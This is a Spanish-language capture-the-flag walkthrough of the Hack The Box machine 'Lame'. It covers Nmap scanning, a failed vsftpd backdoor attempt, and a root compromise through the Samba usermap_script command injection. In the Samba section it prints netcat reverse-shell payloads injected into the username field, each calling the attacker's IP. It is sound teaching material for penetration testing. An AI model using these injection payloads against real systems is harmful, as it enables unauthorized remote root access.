# Lame by Zayrus

Skills: Escaneo y enumeración de servicios - Acceso a servicios remotos - Explotación de vulnerabilidades conocidas  - Uso de herramientas de explotación - Payloads y reverse shells - Post-explotación básica - Linux command-line y permisos

![Lame.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/Lame.png)

# 🧠 **Habilidades y Skills Necesarios para Completar “Lame”**

### 🔍 Enumeración

- Uso de **Nmap** para escanear puertos y servicios.
- Interpretar versiones de servicios (como Samba y FTP).
- Identificación de vulnerabilidades conocidas usando:
    - `searchsploit`
    - Bases de datos como Exploit-DB o Google Hacking

### 📂 Herramientas que se usarán

- `nmap`
- `smbclient`
- `searchsploit` o `msfconsole`
- Linux terminal (para movernos dentro del sistema)

### 🎯 Explotación

- Comprensión básica de **Samba (SMB)** y cómo explotar versiones vulnerables.
- Uso de **Metasploit Framework** para explotación automatizada.
- Conocimiento de exploits como `samba/usermap_script` o similares.

### 🧪 Post-Explotación

- Uso de comandos básicos en Linux para navegar por el sistema.
- Buscar y leer las flags: `user.txt` y `root.txt`.

# 🔎RECONOCIMIENTO🔎

## Nmap

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oN Scan_Lame

```

### Desglose de los parámetros:

- `-p-`: Escanea **todos los puertos TCP** (del 1 al 65535).
- `--open`: Solo muestra los **puertos abiertos**.
- `-sSCV`: Tres opciones combinadas:
    - `sS`: Escaneo TCP SYN (rápido y sigiloso).
- `--min-rate 5000`: Fuerza una tasa mínima de envío de paquetes (5000 por segundo), para mayor velocidad.
- `vvv`: Modo muy detallado (verbose).
- `n`: No hace resolución DNS.
- `Pn`: Omite el "ping" inicial (asume que el host está **activo**).
- `oN Scan_Lame` : Guarda la salida en el archivo `Scan_Lame`.

## Resultado

```bash
# Nmap 7.95 scan initiated Sun May  4 19:28:07 2025 as: /usr/lib/nmap/nmap --privileged -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN Scan_Lame 10.10.10.3
Nmap scan report for 10.10.10.3
Host is up, received user-set (0.15s latency).
Scanned at 2025-05-04 19:28:07 -05 for 26s
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3632/tcp open  distccd      syn-ack ttl 63

Read data files from: /usr/share/nmap
# Nmap done at Sun May  4 19:28:33 2025 -- 1 IP address (1 host up) scanned in 26.73 seconds

```

```bash
nmap -sCV -p21,22,139,445,363 10.10.10.3 -oN Scripts_Services
```

### Desglose de los parámetros:

- `-p`
- `-sCV`: Tres opciones combinadas:
    - `sC`: Usa **scripts NSE por defecto** (como detección de versiones o banners).
    - `sV`: Detecta **versiones de servicios**.
- `oN Scripts_Services` : Guarda la salida en el archivo `Scripts_Services`.

## Resultado

```bash
# Nmap 7.95 scan initiated Sun May  4 19:41:13 2025 as: /usr/lib/nmap/nmap --privileged -sCV -p21,22,139,445,3632 -oN Scripts_Services 10.10.10.3
Nmap scan report for 10.10.10.3 (10.10.10.3)
Host is up (0.26s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.69
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m37s, deviation: 2h49m45s, median: 35s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-05-04T20:42:06-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  4 19:42:09 2025 -- 1 IP address (1 host up) scanned in 55.68 second

```

### 🧠 Priorización de Ataques

1. **Samba 3.0.20 (Puerto 445)**
    - Vulnerable a `usermap_script` (RCE sin autenticación).
    - Alta probabilidad de obtener una shell directamente como root.
    - Referencia: `exploit/multi/samba/usermap_script`
2. **vsftpd 2.3.4 (Puerto 21)**
    - Solo algunas versiones maliciosas contienen un backdoor.
    - Puedes probar con `:)` al final del usuario (si responde con shell, es vulnerable).
    - Muy inestable y menos confiable que Samba.
3. **distccd (Puerto 3632)**
    - Permite ejecución remota de código (RCE) si esta mal configurado.
    - Exploit: `exploit/unix/misc/distcc_exec`

### ✅ Servicios Identificados:

| **Puerto** | **Servicio** | **Versión** | **Comentario** |
| --- | --- | --- | --- |
| 21 | FTP | vsftpd 2.3.4 | 💣 Vulnerable. Versión conocida por tener un backdoor en algunas copias. |
| 22 | SSH | OpenSSH 4.7p1 | Posiblemente útil para acceso posterior (pivoting o acceso persistente). |
| 139/445 | SMB | Samba 3.0.20-Debian | 💣 Vulnerable a RCEs clásicos (ej. `usermap_script`). |
| 3632 | distccd | distccd v1 (GCC 4.2.4) | 💣 Potencial RCE (ej. CVE-2004-2687). |

### 🔍 **Enumeración Inicial - Resultados Clave**

- **FTP (Puerto 21)** permite login anónimo → se puede navegar por el sistema de archivos, pero no hay evidencia aún de archivos críticos visibles.
- **Samba (Puerto 139/445)** responde con información sobre versión vulnerable → se confirma que ejecuta `Samba 3.0.20`, vulnerable a RCE sin autenticación.
- **SMB Signing** desactivado → incrementa posibilidad de ataques man-in-the-middle, pero no es el vector aquí.
- **distccd (Puerto 3632)** es un vector de ataque adicional si Samba falla → se puede usar como backup.

# 🎯INTRUSION🎯

## Intento de Explotación del Servicio FTP (Puerto 21)

### 🎯 **Objetivo del Exploit Usado:**

- **Exploit:** `exploit/unix/ftp/vsftpd_234_backdoor`
- **Servicio objetivo:** `vsftpd 2.3.4`
- **Propósito del exploit:**
    
    Aprovechar una versión maliciosamente modificada de `vsftpd` con un **backdoor oculto** que se activa cuando se envía un nombre de usuario con `:)`, lo que abre una shell en el puerto 6200.
    

---

### Interpretación:

- Se conectó correctamente al FTP.
- Envió el payload (probablemente con `:)` como parte del nombre de usuario).
- No obtuvo sesión de retorno.
- No se detectó apertura del puerto 6200 (donde debería escucharse la shell backdoor).

✅ **Resultado: NO vulnerable** al backdoor en este caso.

---

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image.png)

### PoC del Exploit - Código en Python

https://www.exploit-db.com/exploits/49757

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image%201.png)

### ❌ **Por qué falló**

- Aunque `vsftpd 2.3.4` es históricamente vulnerable, **no todas las instalaciones lo están**.
- La vulnerabilidad solo existe si se usa una **versión intencionalmente modificada y maliciosa** (que fue distribuida brevemente en 2011).
- Esta instalación en *Lame* **es legítima y limpia**, aunque antigua.

## Conexión al puerto 21 (FTP

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image%202.png)

## ✅ Análisis de conexión FTP

### 🧾 Lo que ocurrió:

- Me logre conectar exitosamente al servicio FTP en `10.10.10.3` (puerto 21).
- Inicie sesión como `anonymous` sin contraseña real (lo permite porque está habilitado).
- Entre al sistema y navegaste al directorio `/`, pero no hay archivos listados.

## 🔍 ¿Qué significa “acceso anónimo”?

Cuando un servidor FTP permite **login con el usuario `anonymous`**, está aceptando conexiones **sin credenciales reales**, usualmente para compartir archivos públicamente. El comportamiento estándar es:

- Usuario: `anonymous`
- Password: cualquier cosa.

## Explotación Samba 3.0.20

## 🧠 ¿Qué es Samba?

Samba es un software que permite compartir archivos entre Linux y Windows usando el protocolo SMB. Por ejemplo, permite que una carpeta de Linux se vea como una unidad de red en una PC con Windows.

## 💥 ¿Qué es el CVE-2007-2447?

Es una vulnerabilidad en la opción llamada `username map script` de Samba.

Esta opción permite ejecutar un **script externo** cuando alguien intenta autenticarse, para traducir el nombre de usuario que llega.

### Buscando exploits con searchsploit

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image%203.png)

### 🛠️ ¿Cómo funciona la vulnerabilidad?

- Samba tiene una opción mal configurada por defecto:

```python
username map script = /some/script %u
```

- %u es reemplazado por el nombre de usuario que el cliente intenta usar.
- Pero Samba no filtra caracteres especiales como ;, &&, o | en el nombre del usuario.
- Entonces, si tú te conectas y pones como usuario algo como:

```python
; nc 10.10.14.2 4444 -e /bin/sh ;
```

- Samba lo mete en un comando del sistema como si fuera legítimo:

```python
/some/script ; nc 10.10.14.2 4444 -e /bin/sh ;
```

El sistema interpreta eso como:

“Ejecuta el script... y después abre una shell reversa hacia el atacante”.

## Listando los recursos disponibles en el servidor

```bash
smbclient -L 10.10.10.3 -N
```

🔐 Autenticación:

```bash
Anonymous login successful
```

Esto confirma que el servidor Samba permite acceso anónimo (sin usuario/contraseña).

Es clave para obtener archivos o shells si hay alguna share mal configurada.

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image%204.png)

## 🧾 Explicación por partes:

- `smbclient`: es una herramienta de línea de comandos para interactuar con recursos compartidos SMB/CIFS (como lo haría un cliente de red de Windows).
- `L`: lista los recursos (shares) disponibles en el servidor.
- `10.10.10.3`: es la IP del servidor que estás escaneando (en este caso, la máquina "Lame").
- `N`: le dice a `smbclient` que **no use contraseña** (es decir, intente conexión **anónima**).

## 🚨 Uso de Metasploit

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image%205.png)

### ✅ **1. Configuración del exploit**

En el módulo `multi/samba/usermap_script` configuraste:

- `RHOSTS`: `10.10.10.3` → IP de la máquina víctima (HackTheBox "Lame")
- `RPORT`: `139` → Puerto SMB (NetBIOS Session Service)
- `LHOST`: `10.10.16.69` → Tu IP (VPN tun0, desde donde escuchas la conexión)
- `LPORT`: `4444` → Puerto en el que estás esperando recibir una reverse shell

### ✅ **2. Payload utilizado**

Se usa `cmd/unix/reverse_netcat`, que es un **payload que ejecuta una reverse shell usando `nc` (netcat)**, desde la víctima hacia ti.

### ✅ 3. Ejecución del exploit

Cuando ejecutas run, el módulo:

- Inyecta un payload dentro del campo username usando la técnica:

```bash
/=`nohup nc 10.10.16.69 4444 -e /bin/sh`
```

- Samba, al interpretar ese nombre de usuario, ejecuta el comando sin autenticación.

### ✅ 4. Resultado

- Se abre una reverse shell desde la víctima (10.10.10.3) hacia ti (10.10.16.69:4444).
- La shell es abierta como usuario root en la máquina víctima.

## 🧩 **Post-explotación y captura de flags**

Una vez dentro del sistema como root, se realiza la fase de **post-explotación**, donde se localizan los archivos `user.txt` y `root.txt`, los cuales contienen las flags.

```bash
find / -name "user.txt" -o -name "root.txt"
```

Este comando busca, **en todo el sistema**, archivos llamados:

- `user.txt` → suele contener la **flag del usuario** (primer objetivo)
- `root.txt` → suele contener la **flag de root** (segundo y principal objetivo)

### 📂 Resultado:

- `/home/makis/user.txt` → Archivo del usuario normal
- `/root/root.txt` → Archivo del usuario root

![image.png](Lame%20by%20Zayrus%201e9cb9b1e60b80b29c45f839166a690a/image%206.png)

# ✅ CONCLUSION ✅

**Reconocimiento inicial (Nmap):**

Se identificaron múltiples servicios activos:

- **FTP (21)**: `vsftpd 2.3.4` con acceso anónimo.
- **SSH (22)**: `OpenSSH 4.7p1` (sin uso en esta intrusión).
- **Samba (139/445)**: `Samba 3.0.20`, vulnerable.
- **distccd (3632)**: En desuso, no explotado.

**Análisis del servicio FTP:**

- Se confirmó que permitía login **anónimo**, pero **no se obtuvo una shell funcional**.
- Se intentó explotar `vsftpd 2.3.4` (CVE-2011-2523) con **Metasploit**, pero no se obtuvo sesión. Esto confirmó que el backdoor **no estaba presente o no era funcional** en esta instancia.

**Explotación exitosa vía Samba (CVE-2007-2447):**

- Se utilizó el módulo `multi/samba/usermap_script` en **Metasploit**.
- Este exploit aprovecha una **inyección de comandos** en el campo de nombre de usuario antes del proceso de autenticación (por el uso inseguro de `username map script`).
- Se obtuvo una **reverse shell como root**, directamente, sin necesidad de credenciales.

**Post-explotación:**

- Se localizaron las flags (`user.txt` y `root.txt`) mediante un `find` global.
- Esto confirmó **control total del sistema** y la finalización exitosa de la máquina.